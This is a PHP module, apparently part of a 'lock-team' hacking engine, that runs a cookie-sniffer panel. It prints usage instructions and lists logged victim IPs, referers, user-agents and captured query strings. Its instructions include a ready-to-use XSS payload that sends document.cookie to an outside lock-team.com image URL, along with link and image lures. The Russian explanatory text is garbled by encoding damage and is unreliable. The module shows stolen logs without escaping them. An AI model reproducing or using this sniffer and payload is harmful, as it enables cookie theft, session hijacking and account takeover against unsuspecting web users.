<?php

if ( !defined ( "IN_LOCK_TEAM_ENGINE" ) ) {
   print "Access denied!";
   exit ();
}

class GLOBAL_SNIFFER {

      function show_sniffer_info ( ) {

               $result = "
                          <center class=porr>On-Line �������</center><br>
                          <b class=porr>����� �������� : </b><br>
                          <b class=por>http://www.lock-team.com/<b class=porr>���_�����</b>.jpg?<b class=porr>��� �����</b></b><br><br>

                          ������� ��������� �������� IP �����, ������ �����(URL) ��������� � ������� ��� ������ ������, � ��������� ����� ������, ���������� �������� � �������.<br><br>
                          ������� ���������� �������� ���������� �������� (GIF) � ��������� 1x1 px, ��� ��������� �������� ��� ��� ��������������� �� ������ � ���� <b class=date>". htmlspecialchars ( "<a href=\"\"></a>" ) ."</b>, ��� � � �������� src (source) � ���� <b class=date>". htmlspecialchars ( "<img src=\"\">" ) ."</b>.<br><br>
                          ��� �������������� ��������� ������������ ������� � ����� ��������� �������� ������������ ������ ������ ��������.
                          �������� ���������� �������� �������������� ����� ������-URL, ������������� ����� ����� <b class=porr>?</b>. � ������� :<br>
                          <b class=por>http://www.lock-team.com/<b class=porr>���_�����</b>.jpg?<b class=porr>��� �����</b></b><br>
                          ��� ������ <b class=porr>����� �����</b> ����� ���� ����������� ����� ��������� (�������� ��� ���������) ����� , ����� ����� � ������������� (_)<br>
                          ������ ��� ��������� ��� �������� � ������ ������� ��� ������ /cgi-bin/, � �������� ������ ��������� � ������ ��� �����.<br>
                          <br>
                          ������� ������������� �������� : <br>
                          <b class=date>����� �� ������� ������ :</b><br>
                          <b class=por>". htmlspecialchars ( "<a href=\"http://lock-team.com/my.jpg?privet\">Click here</a>" ) ."</b><br>
                          <b class=date>����� ��� ������� :</b><br>
                          <b class=por>". htmlspecialchars ( "<img src=\"http://lock-team.com/agent_007.jpg?privet\">" ) ."</b><br>
                          <b class=date>����� �� ������� :</b><br>
                          <b class=por>". htmlspecialchars ( "<script>" ) ."<br>". htmlspecialchars ( "img = new Image();" ). "<br>". htmlspecialchars ( "img.src = \"http://lock-team.com/sniffer.jpg?\"+document.cookie;" ) ."<br>". htmlspecialchars ( "</script>" ) ."</b><br><br>
               ";
               
               return $result;
               
      }

      function show_last_logs ( ) {
               global $sql;
               
               $query = "SELECT * FROM `". SQL_TABLE_GLOBAL_SNIFFER ."` ORDER BY `id` DESC LIMIT 25";
               $data = $sql->query ( $query, "print_error_and_exit" );

               $logov = mysql_num_rows ( $data );
               $result = "<center class=porr>��������� ������ (<b class=por>". ( $logov < 25 ? $logov : 25 ) ."</b>)</center><br>";
               $result .= "<button class=\"button\" onclick=\"location.reload(true)\" style=\"width : 100%\">��������</button><br><br>";

               while ( $log = mysql_fetch_assoc ( $data ) ) :
               
                     $url = parse_url ( urldecode ( base64_decode ( $log["referer"] ) ) );
                     if ( !isset ( $url["host"] ) ) $url["host"] = "unknown";
                     if ( !isset ( $url["scheme"] ) ) $url["scheme"] = "xxxx";
                     $result .= "
                                 <table cellpadding=\"1\" cellspacing=\"0\" border=\"0\" style=\"border : 1px dashed black; width:100%\">
                                 <tr>
                                     <td width=\"110\"><b class=porr>IP - </b><b class=date>". $log["ip_address"] ."</b></td>
                                     <td><b class=porr>Scheme - </b>". $url["scheme"] ."</td>
                                     <td><b class=porr>Site - </b><b class=date>". $url["host"] ."</b></td>
                                     <td width=\"200\"><b class=por>Date - </b><tt class=date>". $log["create_time"] ."</tt></td>
                                 </tr>
                                 <tr>
                                     <td><b class=por>Referer</b></td>
                                     <td colspan=\"3\"><b class=date>". urldecode ( base64_decode ( $log["referer"] ) ) ."</b></td>
                                 </tr>
                                 <tr>
                                     <td><b class=por>User-Agent</b></td>
                                     <td colspan=\"3\"><tt class=date>". $log["user_agent"] ."</tt></td>
                                 </tr>
                                 <tr>
                                     <td><br><b class=porr>Query String</b></td>
                                     <td colspan=\"3\"><br><tt class=date>". urldecode ( base64_decode ( $log["content"] ) ) ."</tt></td>
                                 </tr>
                                 </table><br>
                     ";
               endwhile;

               return $result;
               
      }

}

?>